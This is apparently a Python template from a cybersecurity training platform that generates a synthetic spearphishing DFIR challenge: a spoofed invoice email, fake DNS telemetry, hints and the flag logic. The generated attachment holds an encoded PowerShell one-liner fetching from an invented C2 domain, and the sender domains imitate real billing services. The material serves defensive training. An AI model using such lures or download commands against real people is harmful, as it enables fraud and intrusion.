"""Human-crafted Phishing DFIR Template."""
from pathlib import Path
from typing import Dict, Any, List, Optional
import base64
import datetime
import hashlib
import json
import random

from cyberlab.services.generator.template_base import BaseChallengeTemplate


class PhishingDfirTemplate(BaseChallengeTemplate):
    """
    Template for Spearphishing & Invoice Fraud Analysis.
    Generates synthetic email (.eml) with DKIM/SPF spoofing and DNS telemetry
    containing C2 callbacks with dynamic flags.
    """

    template_id = "phishing-dfir"
    title = "DFIR Incident: Spearphishing & Invoice Fraud Analysis"
    category = "DFIR Investigation"
    difficulty = "Intermediate"
    base_points = 150
    duration_minutes = 50
    competency_id = "phishing_analysis"
    competency_weight = 1.0

    SENDER_DOMAINS = [
        "quickbooks-invoicing-update.com",
        "apex-billing-portal.net",
        "xero-cloud-invoices.org",
        "freshbooks-secure-pay.com",
        "stripe-billing-gateway.net",
    ]

    C2_DOMAINS = [
        "update-service-c2.net",
        "beacon-telemetry-gate.com",
        "cloud-sync-c2.org",
        "cdn-fastly-edge.info",
    ]

    def get_slot_schema(self) -> Dict[str, Dict[str, Any]]:
        return {
            "incident_codename": {"type": "str", "description": "Investigation operation codename"},
            "sender_domain": {"type": "str", "description": "Spoofed/typosquatted sender domain"},
            "sender_email": {"type": "str", "description": "Sender email address"},
            "recipient_email": {"type": "str", "description": "Target employee email"},
            "c2_domain": {"type": "str", "description": "Correlated C2 callback domain"},
            "invoice_id": {"type": "str", "description": "Phishing invoice identifier"},
            "flag_nonce": {"type": "str", "description": "Randomized token for anti-cheat flag"},
        }

    def generate_random_slots(
        self, seed: Optional[str] = None, overrides: Optional[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        rnd = random.Random(seed)
        domain = rnd.choice(self.SENDER_DOMAINS)
        c2 = rnd.choice(self.C2_DOMAINS)
        seed_hash = hashlib.sha256((seed or str(rnd.random())).encode()).hexdigest()[:8]

        slots = {
            "incident_codename": f"Operation PhishCatch-{seed_hash[:4]}",
            "sender_domain": domain,
            "sender_email": f"billing-dept@{domain}",
            "recipient_email": "sarah.jenkins@fintech-corp.internal",
            "c2_domain": c2,
            "invoice_id": f"INV-2026-{rnd.randint(1000, 9999)}",
            "flag_nonce": seed_hash,
            "seed_hash": seed_hash,
        }

        if overrides:
            slots.update(overrides)

        return slots

    def compute_flag(self, slots: Dict[str, Any]) -> str:
        domain_tag = slots.get("sender_domain", "invoice")[:12].replace("-", "_").replace(".", "_")
        nonce = slots.get("flag_nonce", "2026")
        return f"FLAG{{dmarc_fail_{domain_tag}_{nonce}}}"

    def generate_hints(self, slots: Dict[str, Any]) -> List[Dict[str, Any]]:
        return [
            {
                "id": 1,
                "content": f"Inspect the Authentication-Results in the email headers. Notice that the SPF/DMARC policy fails for '{slots.get('sender_domain')}'.",
                "penalty": 20,
            },
            {
                "id": 2,
                "content": "Analyze the carved attachment macro. It executes a Base64 PowerShell one-liner. Note that PowerShell '-enc' payloads use UTF-16LE encoding.",
                "penalty": 30,
            },
            {
                "id": 3,
                "content": f"In the DNS telemetry, correlate DNS query traffic for '{slots.get('c2_domain')}'. Inspect the TXT response notes to uncover the verified containment flag.",
                "penalty": 40,
            },
        ]

    def generate_objectives(self, slots: Dict[str, Any]) -> List[str]:
        return [
            f"Analyze the raw RFC-822 email headers and evaluate SPF/DKIM/DMARC authentication failures.",
            f"Carve and deobfuscate the malicious payload embedded in the spearphishing attachment.",
            f"Correlate DNS telemetry to uncover the active C2 beaconing channel and retrieve the flag.",
        ]

    def generate_scenario_description(self, slots: Dict[str, Any]) -> str:
        return (
            f"### Scenario: {slots.get('incident_codename')}\n\n"
            f"An executive assistant reported receiving an urgent, unsolicited invoice email claiming to be from "
            f"`{slots.get('sender_domain')}` regarding `{slots.get('invoice_id')}`.\n\n"
            f"Your mission as DFIR Specialist is to analyze the email headers, extract the staging payload, "
            f"trace the C2 network connection, and verify the containment flag."
        )

    def synthesize_artifacts(
        self, slots: Dict[str, Any], output_dir: Path
    ) -> Dict[str, Path]:
        data_dir = output_dir / "data"
        data_dir.mkdir(parents=True, exist_ok=True)

        flag = self.compute_flag(slots)
        c2 = slots.get("c2_domain", "update-service-c2.net")
        sender = slots.get("sender_email", "billing@quickbooks-invoicing-update.com")
        domain = slots.get("sender_domain", "quickbooks-invoicing-update.com")
        invoice_id = slots.get("invoice_id", "INV-2026-8841")

        # 1. Synthesize urgent_invoice.eml
        eml_content = (
            f"From: Billing Services <{sender}>\n"
            f"To: Sarah Jenkins <sarah.jenkins@fintech-corp.internal>\n"
            f"Subject: URGENT: Past Due Notice - Invoice #{invoice_id}\n"
            f"Date: Wed, 10 Sep 2026 08:22:15 +0000\n"
            f"Message-ID: <{invoice_id}.12345@{domain}>\n"
            f"Authentication-Results: mx.fintech-corp.internal;\n"
            f"  dkim=none;\n"
            f"  spf=softfail (sender IP 198.51.100.99 is not allowed by domain {domain});\n"
            f"  dmarc=fail action=none header.from={domain}\n"
            f"Received-SPF: softfail (Fintech-Corp Mail Gateway: domain {domain} does not designate 198.51.100.99 as permitted sender)\n"
            f"Content-Type: multipart/mixed; boundary=\"====BOUNDARY1234====\"\n\n"
            f"--====BOUNDARY1234====\n"
            f"Content-Type: text/plain; charset=\"UTF-8\"\n\n"
            f"Dear Customer,\n\n"
            f"Your account has a past-due balance for Invoice {invoice_id}. Please review the attached document immediately to prevent service suspension.\n\n"
            f"--====BOUNDARY1234====\n"
            f"Content-Type: application/vnd.ms-word.document.macroEnabled.12; name=\"{invoice_id}_details.docm\"\n"
            f"Content-Transfer-Encoding: base64\n\n"
            + base64.b64encode(f"Macro: powershell -enc {base64.b64encode(f'Invoke-WebRequest -Uri http://{c2}/sync'.encode('utf-16le')).decode()}".encode()).decode()
            + f"\n--====BOUNDARY1234====--\n"
        )
        eml_file = data_dir / "urgent_invoice.eml"
        eml_file.write_text(eml_content, encoding="utf-8")

        # 2. Synthesize dns_telemetry.json
        dns_records = [
            {
                "timestamp": "2026-09-10 08:30:11",
                "query_name": "fintech-corp.internal",
                "record_type": "A",
                "resolved_ip": "10.0.0.1",
                "notes": "Internal DC resolution",
            },
            {
                "timestamp": "2026-09-10 08:31:45",
                "query_name": f"api.{c2}",
                "record_type": "A",
                "resolved_ip": "198.51.100.200",
                "notes": "Suspicious external beaconing detected from FIN-WS-1002",
            },
            {
                "timestamp": "2026-09-10 08:32:00",
                "query_name": f"c2-auth.{c2}",
                "record_type": "TXT",
                "resolved_ip": "N/A",
                "notes": f"TXT Record verification: {flag}",
            },
        ]
        dns_file = data_dir / "dns_telemetry.json"
        with open(dns_file, "w") as f:
            json.dump(dns_records, f, indent=2)

        return {"urgent_invoice.eml": eml_file, "dns_telemetry.json": dns_file}

    def generate_notebook(
        self, slots: Dict[str, Any], output_dir: Path
    ) -> Path:
        marimo_dir = output_dir / "marimo"
        marimo_dir.mkdir(parents=True, exist_ok=True)
        target_nb = marimo_dir / "challenge.py"

        from cyberlab.core.config import settings
        src_nb = settings.CHALLENGES_DIR / "02-phishing-dfir" / "marimo" / "challenge.py"
        code = src_nb.read_text(encoding="utf-8")

        flag = self.compute_flag(slots)
        dynamic_hash = hashlib.sha256(flag.encode()).hexdigest()

        code = code.replace(
            'target_hash = "602d33ce33a59814ea34676156e54f7385a4439c27ba9e46a788bb2569fa35cb"',
            f'target_hash = "{dynamic_hash}"'
        )

        target_nb.write_text(code, encoding="utf-8")
        return target_nb
